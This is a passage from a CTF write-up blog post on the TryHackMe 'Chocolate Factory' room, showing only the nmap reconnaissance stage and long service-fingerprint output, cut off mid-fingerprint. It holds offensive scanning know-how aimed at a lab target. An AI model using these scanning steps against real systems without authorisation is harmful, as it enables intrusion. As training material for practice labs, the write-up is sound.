---
layout: post
current: post
cover: 'assets/images/chocolatefactory/cover.png'
navigation: True
title: "Chocolate Factory CTF Write Up"
date: 2021-01-20 00:00:00
tags: [tryhackme, ctf, easy]
class: post-template
subclass: 'post'
author: darryn
---
![chocolatefactory](/assets/images/chocolatefactory/cover.png)

### Overview

[Chocolate Factory](https://tryhackme.com/room/chocolatefactory) is a easy CTF room on [TryHackMe](https://tryhackme.com). 

> This room was designed so that hackers can revisit the Willy Wonka's Chocolate Factory and meet Oompa Loompa
>
> This is a beginner friendly room!
>

### Nmap

I deployed the machine and was given the target IP 10.10.224.249 I started a NMAP scan to check the available ports. 

```highlight
└──╼ $sudo nmap -sC -sV -oN nmap/initial 10.10.224.249                                               
Starting Nmap 7.80 ( https://nmap.org ) at 2021-01-19 20:33 GMT
Nmap scan report for 10.10.224.249                             
Host is up (0.028s latency).                                   
Not shown: 989 closed ports                                    
PORT    STATE SERVICE    VERSION
21/tcp  open  ftp        vsftpd 3.0.3
|_auth-owners: ERROR: Script execution failed (use -d to debug)
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_-rw-rw-r--    1 1000     1000       208838 Sep 30 14:31 gum_room.jpg
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:{Attacker IP}
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 2
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp  open  ssh        OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
|_auth-owners: ERROR: Script execution failed (use -d to debug)
| ssh-hostkey: 
|   2048 16:31:bb:b5:1f:cc:cc:12:14:8f:f0:d8:33:b0:08:9b (RSA)
|   256 e7:1f:c9:db:3e:aa:44:b6:72:10:3c:ee:db:1d:33:90 (ECDSA)
|_  256 b4:45:02:b6:24:8e:a9:06:5f:6c:79:44:8a:06:55:5e (ED25519)
80/tcp  open  http       Apache httpd 2.4.29 ((Ubuntu))
|_auth-owners: ERROR: Script execution failed (use -d to debug)
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
100/tcp open  newacct?
|_auth-owners: ERROR: Script execution failed (use -d to debug)
| fingerprint-strings: 
|   GenericLines, NULL: 
|     "Welcome to chocolate room!! 
|     ___.---------------.
|     .'__'__'__'__'__,` . ____ ___ \r
|     _:\x20 |:. \x20 ___ \r
|     \'__'__'__'__'_`.__| `. \x20 ___ \r
|     \'__'__'__\x20__'_;-----------------`
|     \|______________________;________________|
|     small hint from Mr.Wonka : Look somewhere else, its not here! ;) 
|_    hope you wont drown Augustus"
106/tcp open  pop3pw?
|_auth-owners: ERROR: Script execution failed (use -d to debug)
| fingerprint-strings: 
|   GenericLines, NULL: 
|     "Welcome to chocolate room!! 
|     ___.---------------.
|     .'__'__'__'__'__,` . ____ ___ \r
|     _:\x20 |:. \x20 ___ \r
|     \'__'__'__'__'_`.__| `. \x20 ___ \r
|     \'__'__'__\x20__'_;-----------------`
|     \|______________________;________________|
|     small hint from Mr.Wonka : Look somewhere else, its not here! ;) 
|_    hope you wont drown Augustus"
109/tcp open  pop2?
| fingerprint-strings: 
|   GenericLines, NULL: 
|     "Welcome to chocolate room!! 
|     ___.---------------.
|     .'__'__'__'__'__,` . ____ ___ \r
|     _:\x20 |:. \x20 ___ \r
|     \'__'__'__'__'_`.__| `. \x20 ___ \r
|     \'__'__'__\x20__'_;-----------------`
|     \|______________________;________________|
|     small hint from Mr.Wonka : Look somewhere else, its not here! ;) 
|_    hope you wont drown Augustus"
110/tcp open  pop3?
|_auth-owners: ERROR: Script execution failed (use -d to debug)
| fingerprint-strings: 
|   GenericLines, NULL: 
|     "Welcome to chocolate room!! 
|     ___.---------------.
|     .'__'__'__'__'__,` . ____ ___ \r
|     _:\x20 |:. \x20 ___ \r
|     \'__'__'__'__'_`.__| `. \x20 ___ \r
|     \'__'__'__\x20__'_;-----------------`
|     \|______________________;________________|
|     small hint from Mr.Wonka : Look somewhere else, its not here! ;) 
|_    hope you wont drown Augustus"
111/tcp open  rpcbind?
|_auth-owners: ERROR: Script execution failed (use -d to debug)
| fingerprint-strings: 
|   NULL, RPCCheck: 
|     "Welcome to chocolate room!! 
|     ___.---------------.
|     .'__'__'__'__'__,` . ____ ___ \r
|     _:\x20 |:. \x20 ___ \r
|     \'__'__'__'__'_`.__| `. \x20 ___ \r
|     \'__'__'__\x20__'_;-----------------`
|     \|______________________;________________|
|     small hint from Mr.Wonka : Look somewhere else, its not here! ;) 
|_    hope you wont drown Augustus"
113/tcp open  ident?
|_auth-owners: ERROR: Script execution failed (use -d to debug)
| fingerprint-strings: 
|   GenericLines, GetRequest, Help, LDAPSearchReq, NULL, TLSSessionReq, TerminalServerCookie, X11Probe: 
|_    http://localhost/key_rev_key <- You will find the key here!!!
119/tcp open  nntp?
|_auth-owners: ERROR: Script execution failed (use -d to debug)
| fingerprint-strings: 
|   GenericLines, NULL: 
|     "Welcome to chocolate room!! 
|     ___.---------------.
|     .'__'__'__'__'__,` . ____ ___ \r
|     _:\x20 |:. \x20 ___ \r
|     \'__'__'__'__'_`.__| `. \x20 ___ \r
|     \'__'__'__\x20__'_;-----------------`
|     \|______________________;________________|
|     small hint from Mr.Wonka : Look somewhere else, its not here! ;) 
|_    hope you wont drown Augustus"
125/tcp open  locus-map?
|_auth-owners: ERROR: Script execution failed (use -d to debug)
| fingerprint-strings: 
|   GenericLines, NULL: 
|     "Welcome to chocolate room!! 
|     ___.---------------.
|     .'__'__'__'__'__,` . ____ ___ \r
|     _:\x20 |:. \x20 ___ \r
|     \'__'__'__'__'_`.__| `. \x20 ___ \r
|     \'__'__'__\x20__'_;-----------------`
|     \|______________________;________________|
|     small hint from Mr.Wonka : Look somewhere else, its not here! ;) 
|_    hope you wont drown Augustus"
8 services unrecognized despite returning data. If you know the service/version, please submit the following fingerprints at https://nmap.org/cgi-bin/submit.cgi?new-service :
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port100-TCP:V=7.80%I=7%D=1/19%Time=60073A7E%P=x86_64-pc-linux-gnu%r(NUL
SF:L,20F,"\"Welcome\x20to\x20chocolate\x20room!!\x20\r\n\x20\x20\x20\x20__
SF:_\x20\x20___\x20\x20___\x20\x20___\x20\x20___\.---------------\.\r\n\x2
SF:0\x20\.'\\__\\'\\__\\'\\__\\'\\__\\'\\__,`\x20\x20\x20\.\x20\x20____\x2
SF:0___\x20\\\r\n\x20\x20\\\|\\/\x20__\\/\x20__\\/\x20__\\/\x20__\\/\x20_:
SF:\\\x20\x20\|:\.\x20\x20\\\x20\x20\\___\x20\\\r\n\x20\x20\x20\\\\'\\__\\
SF:'\\__\\'\\__\\'\\__\\'\\_`\.__\|\x20\x20`\.\x20\\\x20\x20\\___\x20\\\r\
SF:n\x20\x20\x20\x20\\\\/\x20__\\/\x20__\\/\x20__\\/\x20__\\/\x20__:\x20\x
SF:20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\\\r\n\x20\x2
SF:0\x20\x20\x20\\\\'\\__\\'\\__\\'\\__\\\x20\\__\\'\\_;-----------------`
SF:\r\n\x20\x20\x20\x20\x20\x20\\\\/\x20\x20\x20\\/\x20\x20\x20\\/\x20\x20
SF:\x20\\/\x20\x20\x20\\/\x20:\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20
SF:\x20\x20\x20\x20\x20\x20\|\r\n\x20\x20\x20\x20\x20\x20\x20\\\|_________
SF:_____________;________________\|\r\n\r\nA\x20small\x20hint\x20from\x20M
SF:r\.Wonka\x20:\x20Look\x20somewhere\x20else,\x20its\x20not\x20here!\x20;
SF:\)\x20\r\nI\x20hope\x20you\x20wont\x20drown\x20Augustus\"\x20")%r(Gener
SF:icLines,20F,"\"Welcome\x20to\x20chocolate\x20room!!\x20\r\n\x20\x20\x20
SF:\x20___\x20\x20___\x20\x20___\x20\x20___\x20\x20___\.---------------\.\
SF:r\n\x20\x20\.'\\__\\'\\__\\'\\__\\'\\__\\'\\__,`\x20\x20\x20\.\x20\x20_
SF:___\x20___\x20\\\r\n\x20\x20\\\|\\/\x20__\\/\x20__\\/\x20__\\/\x20__\\/
SF:\x20_:\\\x20\x20\|:\.\x20\x20\\\x20\x20\\___\x20\\\r\n\x20\x20\x20\\\\'
SF:\\__\\'\\__\\'\\__\\'\\__\\'\\_`\.__\|\x20\x20`\.\x20\\\x20\x20\\___\x2
SF:0\\\r\n\x20\x20\x20\x20\\\\/\x20__\\/\x20__\\/\x20__\\/\x20__\\/\x20__:
SF:\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\\\r\n\
SF:x20\x20\x20\x20\x20\\\\'\\__\\'\\__\\'\\__\\\x20\\__\\'\\_;------------
SF:-----`\r\n\x20\x20\x20\x20\x20\x20\\\\/\x20\x20\x20\\/\x20\x20\x20\\/\x
SF:20\x20\x20\\/\x20\x20\x20\\/\x20:\x20\x20\x20\x20\x20\x20\x20\x20\x20\x
SF:20\x20\x20\x20\x20\x20\x20\x20\|\r\n\x20\x20\x20\x20\x20\x20\x20\\\|___
SF:___________________;________________\|\r\n\r\nA\x20small\x20hint\x20fro
SF:m\x20Mr\.Wonka\x20:\x20Look\x20somewhere\x20else,\x20its\x20not\x20here
SF:!\x20;\)\x20\r\nI\x20hope\x20you\x20wont\x20drown\x20Augustus\"\x20");
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port106-TCP:V=7.80%I=7%D=1/19%Time=60073A7E%P=x86_64-pc-linux-gnu%r(NUL
SF:L,20F,"\"Welcome\x20to\x20chocolate\x20room!!\x20\r\n\x20\x20\x20\x20__
SF:_\x20\x20___\x20\x20___\x20\x20___\x20\x20___\.---------------\.\r\n\x2
SF:0\x20\.'\\__\\'\\__\\'\\__\\'\\__\\'\\__,`\x20\x20\x20\.\x20\x20____\x2
SF:0___\x20\\\r\n\x20\x20\\\|\\/\x20__\\/\x20__\\/\x20__\\/\x20__\\/\x20_:
SF:\\\x20\x20\|:\.\x20\x20\\\x20\x20\\___\x20\\\r\n\x20\x20\x20\\\\'\\__\\
SF:'\\__\\'\\__\\'\\__\\'\\_`\.__\|\x20\x20`\.\x20\\\x20\x20\\___\x20\\\r\
SF:n\x20\x20\x20\x20\\\\/\x20__\\/\x20__\\/\x20__\\/\x20__\\/\x20__:\x20\x
SF:20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\\\r\n\x20\x2
SF:0\x20\x20\x20\\\\'\\__\\'\\__\\'\\__\\\x20\\__\\'\\_;-----------------`
SF:\r\n\x20\x20\x20\x20\x20\x20\\\\/\x20\x20\x20\\/\x20\x20\x20\\/\x20\x20
SF:\x20\\/\x20\x20\x20\\/\x20:\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20
SF:\x20\x20\x20\x20\x20\x20\|\r\n\x20\x20\x20\x20\x20\x20\x20\\\|_________
SF:_____________;________________\|\r\n\r\nA\x20small\x20hint\x20from\x20M
SF:r\.Wonka\x20:\x20Look\x20somewhere\x20else,\x20its\x20not\x20here!\x20;
SF:\)\x20\r\nI\x20hope\x20you\x20wont\x20drown\x20Augustus\"\x20")%r(Gener
SF:icLines,20F,"\"Welcome\x20to\x20chocolate\x20room!!\x20\r\n\x20\x20\x20
SF:\x20___\x20\x20___\x20\x20___\x20\x20___\x20\x20___\.---------------\.\
SF:r\n\x20\x20\.'\\__\\'\\__\\'\\__\\'\\__\\'\\__,`\x20\x20\x20\.\x20\x20_
SF:___\x20___\x20\\\r\n\x20\x20\\\|\\/\x20__\\/\x20__\\/\x20__\\/\x20__\\/
SF:\x20_:\\\x20\x20\|:\.\x20\x20\\\x20\x20\\___\x20\\\r\n\x20\x20\x20\\\\'
SF:\\__\\'\\__\\'\\__\\'\\__\\'\\_`\.__\|\x20\x20`\.\x20\\\x20\x20\\___\x2
SF:0\\\r\n\x20\x20\x20\x20\\\\/\x20__\\/\x20__\\/\x20__\\/\x20__\\/\x20__:
SF:\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\\\r\n\
SF:x20\x20\x20\x20\x20\\\\'\\__\\'\\__\\'\\__\\\x20\\__\\'\\_;------------
SF:-----`\r\n\x20\x20\x20\x20\x20\x20\\\\/\x20\x20\x20\\/\x20\x20\x20\\/\x
SF:20\x20\x20\\/\x20\x20\x20\\/\x20:\x20\x20\x20\x20\x20\x20\x20\x20\x20\x
SF:20\x20\x20\x20\x20\x20\x20\x20\|\r\n\x20\x20\x20\x20\x20\x20\x20\\\|___
SF:___________________;________________\|\r\n\r\nA\x20small\x20hint\x20fro
SF:m\x20Mr\.Wonka\x20:\x20Look\x20somewhere\x20else,\x20its\x20not\x20here
SF:!\x20;\)\x20\r\nI\x20hope\x20you\x20wont\x20drown\x20Augustus\"\x20");
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port109-TCP:V=7.80%I=7%D=1/19%Time=60073A7E%P=x86_64-pc-linux-gnu%r(NUL
SF:L,20F,"\"Welcome\x20to\x20chocolate\x20room!!\x20\r\n\x20\x20\x20\x20__
SF:_\x20\x20___\x20\x20___\x20\x20___\x20\x20___\.---------------\.\r\n\x2
SF:0\x20\.'\\__\\'\\__\\'\\__\\'\\__\\'\\__,`\x20\x20\x20\.\x20\x20____\x2
SF:0___\x20\\\r\n\x20\x20\\\|\\/\x20__\\/\x20__\\/\x20__\\/\x20__\\/\x20_:
SF:\\\x20\x20\|:\.\x20\x20\\\x20\x20\\___\x20\\\r\n\x20\x20\x20\\\\'\\__\\
SF:'\\__\\'\\__\\'\\__\\'\\_`\.__\|\x20\x20`\.\x20\\\x20\x20\\___\x20\\\r\
SF:n\x20\x20\x20\x20\\\\/\x20__\\/\x20__\\/\x20__\\/\x20__\\/\x20__:\x20\x
SF:20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\\\r\n\x20\x2
SF:0\x20\x20\x20\\\\'\\__\\'\\__\\'\\__\\\x20\\__\\'\\_;-----------------`
SF:\r\n\x20\x20\x20\x20\x20\x20\\\\/\x20\x20\x20\\/\x20\x20\x20\\/\x20\x20
SF:\x20\\/\x20\x20\x20\\/\x20:\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20
SF:\x20\x20\x20\x20\x20\x20\|\r\n\x20\x20\x20\x20\x20\x20\x20\\\|_________
SF:_____________;________________\|\r\n\r\nA\x20small\x20hint\x20from\x20M
SF:r\.Wonka\x20:\x20Look\x20somewhere\x20else,\x20its\x20not\x20here!\x20;
SF:\)\x20\r\nI\x20hope\x20you\x20wont\x20drown\x20Augustus\"\x20")%r(Gener
SF:icLines,20F,"\"Welcome\x20to\x20chocolate\x20room!!\x20\r\n\x20\x20\x20
SF:\x20___\x20\x20___\x20\x20___\x20\x20___\x20\x20___\.---------------\.\
SF:r\n\x20\x20\.'\\__\\'\\__\\'\\__\\'\\__\\'\\__,`\x20\x20\x20\.\x20\x20_
SF:___\x20___\x20\\\r\n\x20\x20\\\|\\/\x20__\\/\x20__\\/\x20__\\/\x20__\\/
SF:\x20_:\\\x20\x20\|:\.\x20\x20\\\x20\x20\\___\x20\\\r\n\x20\x20\x20\\\\'
SF:\\__\\'\\__\\'\\__\\'\\__\\'\\_`\.__\|\x20\x20`\.\x20\\\x20\x20\\___\x2
SF:0\\\r\n\x20\x20\x20\x20\\\\/\x20__\\/\x20__\\/\x20__\\/\x20__\\/\x20__:
SF:\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\\\r\n\
SF:x20\x20\x20\x20\x20\\\\'\\__\\'\\__\\'\\__\\\x20\\__\\'\\_;------------
SF:-----`\r\n\x20\x20\x20\x20\x20\x20\\\\/\x20\x20\x20\\/\x20\x20\x20\\/\x
SF:20\x20\x20\\/\x20\x20\x20\\/\x20:\x20\x20\x20\x20\x20\x20\x20\x20\x20\x
SF:20\x20\x20\x20\x20\x20\x20\x20\|\r\n\x20\x20\x20\x20\x20\x20\x20\\\|___
SF:___________________;________________\|\r\n\r\nA\x20small\x20hint\x20fro
SF:m\x20Mr\.Wonka\x20:\x20Look\x20somewhere\x20else,\x20its\x20not\x20here
SF:!\x20;\)\x20\r\nI\x20hope\x20you\x20wont\x20drown\x20Augustus\"\x20");
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port110-TCP:V=7.80%I=7%D=1/19%Time=60073A7E%P=x86_64-pc-linux-gnu%r(NUL
SF:L,20F,"\"Welcome\x20to\x20chocolate\x20room!!\x20\r\n\x20\x20\x20\x20__
SF:_\x20\x20___\x20\x20___\x20\x20___\x20\x20___\.---------------\.\r\n\x2
SF:0\x20\.'\\__\\'\\__\\'\\__\\'\\__\\'\\__,`\x20\x20\x20\.\x20\x20____\x2
SF:0___\x20\\\r\n\x20\x20\\\|\\/\x20__\\/\x20__\\/\x20__\\/\x20__\\/\x20_:
SF:\\\x20\x20\|:\.\x20\x20\\\x20\x20\\___\x20\\\r\n\x20\x20\x20\\\\'\\__\\
SF:'\\__\\'\\__\\'\\__\\'\\_`\.__\|\x20\x20`\.\x20\\\x20\x20\\___\x20\\\r\
SF:n\x20\x20\x20\x20\\\\/\x20__\\/\x20__\\/\x20__\\/\x20__\\/\x20__:\x20\x
SF:20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\\\r\n\x20\x2
SF:0\x20\x20\x20\\\\'\\__\\'\\__\\'\\__\\\x20\\__\\'\\_;-----------------`
SF:\r\n\x20\x20\x20\x20\x20\x20\\\\/\x20\x20\x20\\/\x20\x20\x20\\/\x20\x20
SF:\x20\\/\x20\x20\x20\\/\x20:\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20
SF:\x20\x20\x20\x20\x20\x20\|\r\n\x20\x20\x20\x20\x20\x20\x20\\\|_________
SF:_____________;________________\|\r\n\r\nA\x20small\x20hint\x20from\x20M
SF:r\.Wonka\x20:\x20Look\x20somewhere\x20else,\x20its\x20not\x20here!\x20;
SF:\)\x20\r\nI\x20hope\x20you\x20wont\x20drown\x20Augustus\"\x20")%r(Gener
SF:icLines,20F,"\"Welcome\x20to\x20chocolate\x20room!!\x20\r\n\x20\x20\x20
SF:\x20___\x20\x20___\x20\x20___\x20\x20___\x20\x20___\.---------------\.\
SF:r\n\x20\x20\.'\\__\\'\\__\\'\\__\\'\\__\\'\\__,`\x20\x20\x20\.\x20\x20_
SF:___\x20___\x20\\\r\n\x20\x20\\\|\\/\x20__\\/\x20__\\/\x20__\\/\x20__\\/
SF:\x20_:\\\x20\x20\|:\.\x20\x20\\\x20\x20\\___\x20\\\r\n\x20\x20\x20\\\\'
SF:\\__\\'\\__\\'\\__\\'\\__\\'\\_`\.__\|\x20\x20`\.\x20\\\x20\x20\\___\x2
SF:0\\\r\n\x20\x20\x20\x20\\\\/\x20__\\/\x20__\\/\x20__\\/\x20__\\/\x20__:
SF:\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\\\r\n\
SF:x20\x20\x20\x20\x20\\\\'\\__\\'\\__\\'\\__\\\x20\\__\\'\\_;------------
SF:-----`\r\n\x20\x20\x20\x20\x20\x20\\\\/\x20\x20\x20\\/\x20\x20\x20\\/\x
SF:20\x20\x20\\/\x20\x20\x20\\/\x20:\x20\x20\x20\x20\x20\x20\x20\x20\x20\x
SF:20\x20\x20\x20\x20\x20\x20\x20\|\r\n\x20\x20\x20\x20\x20\x20\x20\\\|___
SF:___________________;________________\|\r\n\r\nA\x20small\x20hint\x20fro
SF:m\x20Mr\.Wonka\x20:\x20Look\x20somewhere\x20else,\x20its\x20not\x20here
SF:!\x20;\)\x20\r\nI\x20hope\x20you\x20wont\x20drown\x20Augustus\"\x20");
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port111-TCP:V=7.80%I=7%D=1/19%Time=60073A7E%P=x86_64-pc-linux-gnu%r(NUL
SF:L,20F,"\"Welcome\x20to\x20chocolate\x20room!!\x20\r\n\x20\x20\x20\x20__
SF:_\x20\x20___\x20\x20___\x20\x20___\x20\x20___\.---------------\.\r\n\x2
SF:0\x20\.'\\__\\'\\__\\'\\__\\'\\__\\'\\__,`\x20\x20\x20\.\x20\x20____\x2
SF:0___\x20\\\r\n\x20\x20\\\|\\/\x20__\\/\x20__\\/\x20__\\/\x20__\\/\x20_:
SF:\\\x20\x20\|:\.\x20\x20\\\x20\x20\\___\x20\\\r\n\x20\x20\x20\\\\'\\__\\
SF:'\\__\\'\\__\\'\\__\\'\\_`\.__\|\x20\x20`\.\x20\\\x20\x20\\___\x20\\\r\
SF:n\x20\x20\x20\x20\\\\/\x20__\\/\x20__\\/\x20__\\/\x20__\\/\x20__:\x20\x
SF:20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\\\r\n\x20\x2
SF:0\x20\x20\x20\\\\'\\__\\'\\__\\'\\__\\\x20\\__\\'\\_;-----------------`
SF:\r\n\x20\x20\x20\x20\x20\x20\\\\/\x20\x20\x20\\/\x20\x20\x20\\/\x20\x20
SF:\x20\\/\x20\x20\x20\\/\x20:\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20
SF:\x20\x20\x20\x20\x20\x20\|\r\n\x20\x20\x20\x20\x20\x20\x20\\\|_________
SF:_____________;________________\|\r\n\r\nA\x20small\x20hint\x20from\x20M
SF:r\.Wonka\x20:\x20Look\x20somewhere\x20else,\x20its\x20not\x20here!\x20;
SF:\)\x20\r\nI\x20hope\x20you\x20wont\x20drown\x20Augustus\"\x20")%r(RPCCh
SF:eck,20F,"\"Welcome\x20to\x20chocolate\x20room!!\x20\r\n\x20\x20\x20\x20
SF:___\x20\x20___\x20\x20___\x20\x20___\x20\x20___\.---------------\.\r\n\
SF:x20\x20\.'\\__\\'\\__\\'\\__\\'\\__\\'\\__,`\x20\x20\x20\.\x20\x20____\
SF:x20___\x20\\\r\n\x20\x20\\\|\\/\x20__\\/\x20__\\/\x20__\\/\x20__\\/\x20
SF:_:\\\x20\x20\|:\.\x20\x20\\\x20\x20\\___\x20\\\r\n\x20\x20\x20\\\\'\\__
SF:\\'\\__\\'\\__\\'\\__\\'\\_`\.__\|\x20\x20`\.\x20\\\x20\x20\\___\x20\\\
SF:r\n\x20\x20\x20\x20\\\\/\x20__\\/\x20__\\/\x20__\\/\x20__\\/\x20__:\x20
SF:\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\\\r\n\x20\
SF:x20\x20\x20\x20\\\\'\\__\\'\\__\\'\\__\\\x20\\__\\'\\_;----------------
SF:-`\r\n\x20\x20\x20\x20\x20\x20\\\\/\x20\x20\x20\\/\x20\x20\x20\\/\x20\x
SF:20\x20\\/\x20\x20\x20\\/\x20:\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x
SF:20\x20\x20\x20\x20\x20\x20\|\r\n\x20\x20\x20\x20\x20\x20\x20\\\|_______
SF:_______________;________________\|\r\n\r\nA\x20small\x20hint\x20from\x2
SF:0Mr\.Wonka\x20:\x20Look\x20somewhere\x20else,\x20its\x20not\x20here!\x2
SF:0;\)\x20\r\nI\x20hope\x20you\x20wont\x20drown\x20Augustus\"\x20");
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port113-TCP:V=7.80%I=7%D=1/19%Time=60073A7E%P=x86_64-pc-linux-gnu%r(NUL
SF:L,3E,"http://localhost/key_rev_key\x20<-\x20You\x20will\x20find\x20the\
SF:x20key\x20here!!!\n")%r(GenericLines,3E,"http://localhost/key_rev_key\x
SF:20<-\x20You\x20will\x20find\x20the\x20key\x20here!!!\n")%r(GetRequest,3
SF:E,"http://localhost/key_rev_key\x20<-\x20You\x20will\x20find\x20the\x20
SF:key\x20here!!!\n")%r(Help,3E,"http://localhost/key_rev_key\x20<-\x20You
SF:\x20will\x20find\x20the\x20key\x20here!!!\n")%r(TerminalServerCookie,3E
SF:,"http://localhost/key_rev_key\x20<-\x20You\x20will\x20find\x20the\x20k
SF:ey\x20here!!!\n")%r(TLSSessionReq,3E,"http://localhost/key_rev_key\x20<
SF:-\x20You\x20will\x20find\x20the\x20key\x20here!!!\n")%r(X11Probe,3E,"ht
SF:tp://localhost/key_rev_key\x20<-\x20You\x20will\x20find\x20the\x20key\x
SF:20here!!!\n")%r(LDAPSearchReq,3E,"http://localhost/key_rev_key\x20<-\x2
SF:0You\x20will\x20find\x20the\x20key\x20here!!!\n");
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port119-TCP:V=7.80%I=7%D=1/19%Time=60073A7E%P=x86_64-pc-linux-gnu%r(NUL
SF:L,20F,"\"Welcome\x20to\x20chocolate\x20room!!\x20\r\n\x20\x20\x20\x20__
SF:_\x20\x20___\x20\x20___\x20\x20___\x20\x20___\.---------------\.\r\n\x2
SF:0\x20\.'\\__\\'\\__\\'\\__\\'\\__\\'\\__,`\x20\x20\x20\.\x20\x20____\x2
SF:0___\x20\\\r\n\x20\x20\\\|\\/\x20__\\/\x20__\\/\x20__\\/\x20__\\/\x20_:
SF:\\\x20\x20\|:\.\x20\x20\\\x20\x20\\___\x20\\\r\n\x20\x20\x20\\\\'\\__\\
SF:'\\__\\'\\__\\'\\__\\'\\_`\.__\|\x20\x20`\.\x20\\\x20\x20\\___\x20\\\r\
SF:n\x20\x20\x20\x20\\\\/\x20__\\/\x20__\\/\x20__\\/\x20__\\/\x20__:\x20\x
SF:20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\\\r\n\x20\x2
SF:0\x20\x20\x20\\\\'\\__\\'\\__\\'\\__\\\x20\\__\\'\\_;-----------------`
SF:\r\n\x20\x20\x20\x20\x20\x20\\\\/\x20\x20\x20\\/\x20\x20\x20\\/\x20\x20
SF:\x20\\/\x20\x20\x20\\/\x20:\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20
SF:\x20\x20\x20\x20\x20\x20\|\r\n\x20\x20\x20\x20\x20\x20\x20\\\|_________
SF:_____________;________________\|\r\n\r\nA\x20small\x20hint\x20from\x20M
SF:r\.Wonka\x20:\x20Look\x20somewhere\x20else,\x20its\x20not\x20here!\x20;
SF:\)\x20\r\nI\x20hope\x20you\x20wont\x20drown\x20Augustus\"\x20")%r(Gener
SF:icLines,20F,"\"Welcome\x20to\x20chocolate\x20room!!\x20\r\n\x20\x20\x20
SF:\x20___\x20\x20___\x20\x20___\x20\x20___\x20\x20___\.---------------\.\
SF:r\n\x20\x20\.'\\__\\'\\__\\'\\__\\'\\__\\'\\__,`\x20\x20\x20\.\x20\x20_
SF:___\x20___\x20\\\r\n\x20\x20\\\|\\/\x20__\\/\x20__\\/\x20__\\/\x20__\\/
SF:\x20_:\\\x20\x20\|:\.\x20\x20\\\x20\x20\\___\x20\\\r\n\x20\x20\x20\\\\'
SF:\\__\\'\\__\\'\\__\\'\\__\\'\\_`\.__\|\x20\x20`\.\x20\\\x20\x20\\___\x2
SF:0\\\r\n\x20\x20\x20\x20\\\\/\x20__\\/\x20__\\/\x20__\\/\x20__\\/\x20__:
SF:\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\\\r\n\
SF:x20\x20\x20\x20\x20\\\\'\\__\\'\\__\\'\\__\\\x20\\__\\'\\_;------------
SF:-----`\r\n\x20\x20\x20\x20\x20\x20\\\\/\x20\x20\x20\\/\x20\x20\x20\\/\x
SF:20\x20\x20\\/\x20\x20\x20\\/\x20:\x20\x20\x20\x20\x20\x20\x20\x20\x20\x
SF:20\x20\x20\x20\x20\x20\x20\x20\|\r\n\x20\x20\x20\x20\x20\x20\x20\\\|___
SF:___________________;________________\|\r\n\r\nA\x20small\x20hint\x20fro
SF:m\x20Mr\.Wonka\x20:\x20Look\x20somewhere\x20else,\x20its\x20not\x20here
SF:!\x20;\)\x20\r\nI\x20hope\x20you\x20wont\x20drown\x20Augustus\"\x20");
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port125-TCP:V=7.80%I=7%D=1/19%Time=60073A7E%P=x86_64-pc-linux-gnu%r(NUL
SF:L,20F,"\"Welcome\x20to\x20chocolate\x20room!!\x20\r\n\x20\x20\x20\x20__
SF:_\x20\x20___\x20\x20___\x20\x20___\x20\x20___\.---------------\.\r\n\x2
SF:0\x20\.'\\__\\'\\__\\'\\__\\'\\__\\'\\__,`\x20\x20\x20\.\x20\x20____\x2
SF:0___\x20\\\r\n\x20\x20\\\|\\/\x20__\\/\x20__\\/\x20__\\/\x20__\\/\x20_:
SF:\\\x20\x20\|:\.\x20\x20\\\x20\x20\\___\x20\\\r\n\x20\x20\x20\\\\'\\__\\
SF:'\\__\\'\\__\\'\\__\\'\\_`\.__\|\x20\x20`\.\x20\\\x20\x20\\___\x20\\\r\
SF:n\x20\x20\x20\x20\\\\/\x20__\\/\x20__\\/\x20__\\/\x20__\\/\x20__:\x20\x
SF:20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\\\r\n\x20\x2
SF:0\x20\x20\x20\\\\'\\__\\'\\__\\'\\__\\\x20\\__\\'\\_;-----------------`
SF:\r\n\x20\x20\x20\x20\x20\x20\\\\/\x20\x20\x20\\/\x20\x20\x20\\/\x20\x20
